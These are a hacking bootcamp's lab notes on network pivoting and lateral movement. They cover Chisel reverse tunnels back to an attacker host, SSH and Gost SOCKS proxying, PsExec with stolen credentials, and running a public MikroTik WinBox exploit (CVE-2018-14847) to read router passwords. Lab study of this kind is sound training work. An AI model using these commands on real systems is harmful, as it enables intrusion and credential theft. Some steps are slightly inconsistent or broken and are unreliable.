# Network Pivoting and Lateral Movement - Day 6

## Overview
This document outlines the labs completed on 08/04/2025 during the hacking bootcamp, focusing on network pivoting and lateral movement techniques in Windows and Linux environments.

## Table of Contents
- [Lab 1: Pivoting Windows Example](#lab-1-pivoting-windows-example)
- [Lab 2: Pivoting Windows Task](#lab-2-pivoting-windows-task)
- [Lab 3: Pivoting using built-in Linux capabilities Task](#lab-3-pivoting-using-built-in-linux-capabilities-task)
- [Lab 4: Pivoting Gost Task](#lab-4-pivoting-gost-task)
- [Lab 5: Pivoting Chisel Task](#lab-5-pivoting-chisel-task)
- [Lab 6: Pivoting SSH Task](#lab-6-pivoting-ssh-task)
- [Lab 7: Pivoting Chisel Example](#lab-7-pivoting-chisel-example)
- [Lab 8: Pivoting Network Pivoting](#lab-8-pivoting-network-pivoting)
- [Lab 9: Going Beyond DMZ](#lab-9-going-beyond-dmz)

## Labs

### Lab 1: Pivoting Windows Example
#### Objective
Establish a pivot through a compromised Windows machine to access an internal network.

#### Vulnerabilities
- Exposed Services: Open ports (e.g., RDP) on a compromised Windows host allow pivoting.

#### Requirements
Compromised Windows machine must be accessible with valid credentials.

#### Steps
1. **Setup**
   - Verify connectivity to the compromised Windows host.
   ```bash
   ping <WINDOWS_IP>
   ```
2. **Reconnaissance**
   - Scan for internal network hosts from the compromised machine.
   ```bash
   netscan.exe -r <INTERNAL_SUBNET>
   ```
3. **Exploitation**
   - Download chisel client for windows and linux
   ```bash
   # Download and clean-up the Linux version of Chisel v1.9.1
    wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
    gunzip chisel_1.9.1_linux_amd64.gz
    mv chisel_1.9.1_linux_amd64 chisel

    # Download and clean-up the Windows version of Chisel v1.9.1
    wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
    gunzip chisel_1.9.1_windows_amd64.gz
    mv chisel_1.9.1_windows_amd64 chisel.exe
       ```
   - Start a listener on the attcking machine:
   ```bash
   ./chisel server --port 5000 --reverse
   ```
   - Copy the exe version to victim computer and execute it:
   ```bash
   .\chisel.exe client <ATTACKER_IP>:5000 R:8888:127.0.0.1:8000
   ``
   - Get the flag in your attacking machine from the internal network .
   ```bash
   curl localhost:8888
   ```

#### Why It Works
Compromised Windows hosts with network access allow attackers to pivot by routing traffic through them with chisel.

#### Alternatives
- Use netsh for port forwarding on Windows.

#### Resources
- [Metasploit Pivoting Guide: https://www.offensive-security.com/metasploit-unleashed/pivoting/](https://www.offensive-security.com/metasploit-unleashed/pivoting/)

#### Notes
-   TO-DO.

---

### Lab 2: Pivoting Windows Task
#### Objective
Pivot through a Windows machine to compromise another internal host.

#### Vulnerabilities
- Weak Credentials: Reusable credentials on internal hosts enable lateral movement.

#### Requirements
Compromised Windows machine must have administrative access to another internal host.

#### Steps
1. **Setup**
   - Verify administrative access on the pivot host.
   ```bash
   net use \\<WINDOWS_IP> /user:domain\user <PASSWORD>
   ```
2. **Reconnaissance**
   - Enumerate internal hosts using PowerShell.
   ```powershell
   Get-NetComputer -Domain domain.local
   ```
3. **Exploitation**
   - Use PsExec to execute commands on the internal host.
   ```bash
   impacket-psexec domain.local/user:<PASSWORD>@<INTERNAL_IP> cmd.exe
   ```

#### Why It Works
Administrative access and weak credentials allow command execution on internal hosts via the pivot.

#### Alternatives
- Use WMI for remote command execution.

#### Resources
- [Impacket PsExec: https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)

#### Notes
- Verify domain credentials before attempting PsExec.

---

### Lab 3: Pivoting using built-in Linux capabilities Task
#### Objective
Pivot through a Linux machine using built-in tools to access an internal network.

#### Vulnerabilities
- Open SSH Service: SSH access on a compromised Linux host enables pivoting.

#### Requirements
Compromised Linux machine must have SSH access enabled.

#### Steps
1. **Setup**
   - Verify SSH access to the pivot host.
   ```bash
   ssh user@<LINUX_IP>
   ```
2. **Reconnaissance**
   - Scan internal network from the pivot host.
   ```bash
   nmap -sP <INTERNAL_SUBNET>
   ```
3. **Exploitation**
   - Set up SSH dynamic port forwarding for pivoting.
   ```bash
   ssh -D 9050 user@<LINUX_IP>
   proxychains nmap -sT <INTERNAL_IP>
   ```

#### Why It Works
SSH’s dynamic port forwarding creates a SOCKS proxy, routing traffic through the compromised Linux host to internal networks.

#### Alternatives
- Use iptables for manual port forwarding.

#### Resources
- [SSH Tunneling Guide: https://www.ssh.com/academy/ssh/tunneling-example](https://www.ssh.com/academy/ssh/tunneling-example)

#### Notes
- Configure proxychains to use the SOCKS proxy (port 9050).

---

### Lab 4: Pivoting Gost Task
#### Objective
Use Gost to pivot through a compromised host to access an internal network.

#### Vulnerabilities
- Exposed Services: Compromised host with network access allows Gost-based pivoting.

#### Requirements
Compromised host must be accessible and Gost installed.

#### Steps
1. **Setup**
   - Verify connectivity to the pivot host.
   ```bash
   ping <PIVOT_IP>
   ```
2. **Reconnaissance**
   - Identify internal network hosts.
   ```bash
   nmap -sP <INTERNAL_SUBNET>
   ```
3. **Exploitation**
   - Set up a Gost SOCKS5 proxy.
   ```bash
   gost -L=socks5://:1080 -F=<PIVOT_IP>:22
   proxychains nmap -sT <INTERNAL_IP>
   ```

#### Why It Works
Gost creates a SOCKS5 proxy through the compromised host, enabling access to internal networks.

#### Alternatives
- Use Chisel for similar SOCKS proxy pivoting.

#### Resources
- [Gost Documentation: https://github.com/ginuerzh/gost](https://github.com/ginuerzh/gost)

#### Notes
- Download and install Gost on the pivot host if needed.

---

### Lab 5: Pivoting Chisel Task
#### Objective
Use Chisel to pivot through a compromised host to access an internal network.

#### Vulnerabilities
- Network Access: Compromised host with open ports allows Chisel-based pivoting.

#### Requirements
Compromised host must have Chisel installed and accessible.

#### Steps
1. **Setup**
   - Verify connectivity to the pivot host.
   ```bash
   ping <PIVOT_IP>
   ```
2. **Reconnaissance**
   - Scan internal network from the pivot host.
   ```bash
   nmap -sP <INTERNAL_SUBNET>
   ```
3. **Exploitation**
   - Set up a Chisel SOCKS proxy.
   ```bash
   chisel server -p 8000 --reverse
   chisel client <PIVOT_IP>:8000 R:socks
   proxychains nmap -sT <INTERNAL_IP>
   ```

#### Why It Works
Chisel’s reverse tunneling creates a SOCKS proxy, routing traffic through the compromised host to internal networks.

#### Alternatives
- Use SSH dynamic port forwarding for pivoting.

#### Resources
- [Chisel Documentation: https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)

#### Notes
- Ensure Chisel binaries are available on both attacker and pivot hosts.

---

### Lab 6: Pivoting SSH Task
#### Objective
Pivot through a compromised Linux host using SSH tunneling to access an internal network.

#### Vulnerabilities
- SSH Access: Open SSH service on a compromised host enables tunneling.

#### Requirements
Compromised Linux host must have SSH access enabled.

#### Steps
1. **Setup**
   - Verify SSH access to the pivot host.
   ```bash
   ssh user@<LINUX_IP>
   ```
2. **Reconnaissance**
   - Identify internal network hosts.
   ```bash
   nmap -sP <INTERNAL_SUBNET>
   ```
3. **Exploitation**
   - Set up SSH local port forwarding.
   ```bash
   ssh -L 8080:<INTERNAL_IP>:80 user@<LINUX_IP>
   curl http://localhost:8080
   ```

#### Why It Works
SSH local port forwarding redirects traffic through the compromised host, accessing internal services.

#### Alternatives
- Use SSH dynamic port forwarding for broader network access.

#### Resources
- [SSH Tunneling Guide: https://www.ssh.com/academy/ssh/tunneling-example](https://www.ssh.com/academy/ssh/tunneling-example)

#### Notes
- Update /etc/ssh/sshd_config to allow TCP forwarding if disabled.

---

### Lab 7: Pivoting Chisel Example
#### Objective
Demonstrate pivoting through a compromised host using Chisel to access an internal service.

#### Vulnerabilities
- Exposed Ports: Compromised host with network access allows Chisel tunneling.

#### Requirements
Compromised host must have Chisel installed and accessible.

#### Steps
1. **Setup**
   - Verify connectivity to the pivot host.
   ```bash
   ping <PIVOT_IP>
   ```
2. **Reconnaissance**
   - Identify internal service (e.g., web server).
   ```bash
   nmap -sT <INTERNAL_IP> -p 80
   ```
3. **Exploitation**
   - Set up Chisel reverse tunnel to access the internal service.
   ```bash
   chisel server -p 8000 --reverse
   chisel client <PIVOT_IP>:8000 R:8080:<INTERNAL_IP>:80
   curl http://localhost:8080
   ```

#### Why It Works
Chisel’s reverse tunneling forwards internal service ports through the compromised host to the attacker’s machine.

#### Alternatives
- Use SSH local port forwarding for similar access.

#### Resources
- [Chisel Documentation: https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)

#### Notes
- Test connectivity to the internal service after establishing the tunnel.

---

### Lab 8: Pivoting Network Pivoting
#### Objective
Perform network pivoting to access multiple internal subnets via a compromised host.

#### Vulnerabilities
- Network Access: Compromised host with multiple network interfaces enables pivoting.

#### Requirements
Compromised host must have access to multiple internal subnets.

#### Steps
1. **Setup**
   - Verify connectivity to the pivot host.
   ```bash
   ping <PIVOT_IP>
   ```
2. **Reconnaissance**
   - Enumerate reachable subnets from the pivot host.
   ```bash
   ip route
   ```
3. **Exploitation**
   - Set up a SOCKS proxy using Proxychains and SSH.
   ```bash
   ssh -D 9050 user@<PIVOT_IP>
   proxychains nmap -sT <INTERNAL_SUBNET>
   ```

#### Why It Works
The compromised host’s network interfaces allow routing of traffic to multiple internal subnets via a SOCKS proxy.

#### Alternatives
- Use Metasploit’s autoroute for network pivoting.

#### Resources
- [Network Pivoting Guide: https://www.offensive-security.com/metasploit-unleashed/pivoting/](https://www.offensive-security.com/metasploit-unleashed/pivoting/)

#### Notes
- Ensure proxychains is configured with the correct SOCKS port.

---

### Lab 9: Going Beyond DMZ
#### Objective
Exploit Mikrotik router vulnerability to extract password from history of router accounts.

#### Vulnerabilities
- Mikrotik critical WinBox vulnerability (CVE-2018-14847) which allows for arbitrary file read of plain text passwords

#### Requirements
- Vm should be up and accessible.

#### Steps
1. **Setup**
   - Verify connectivity to the DMZ host.
   ```bash
   ping <TARGET_IP>
   ```
2. **Reconnaissance**
   - Scan internal network from the DMZ host.
   ```bash
   nmap -sV -O <INTERNAL_SUBNET>
   ```
   - You will discover a MikroTik RouterOS device (version 6.40.7) with several exposed services including winbox on port 8291
   
3. **Exploitation**
   - Clone the the exploit from github and exploit it to get the password.
   ```bash
    git clone https://github.com/BigNerd95/WinboxExploit.git mikrotik
    cd mikrotik
    python3  WinboxExploit.py <TARGET_IP> 8291
   ```
   - Use the obtained credentials to access the Mikrotik web interface with the user admin. The password is also the flag.

#### Why It Works
The DMZ host’s access to internal networks allows attackers to tunnel traffic through it, bypassing firewall restrictions.

#### Alternatives
- You could easily bruteforce the password with ffuf and a seclist password wordlist.

#### Resources
- [Winbox Vulnerability Dissection: https://n0p.me/winbox-bug-dissection/](https://n0p.me/winbox-bug-dissection/)

#### Notes
- TODO

---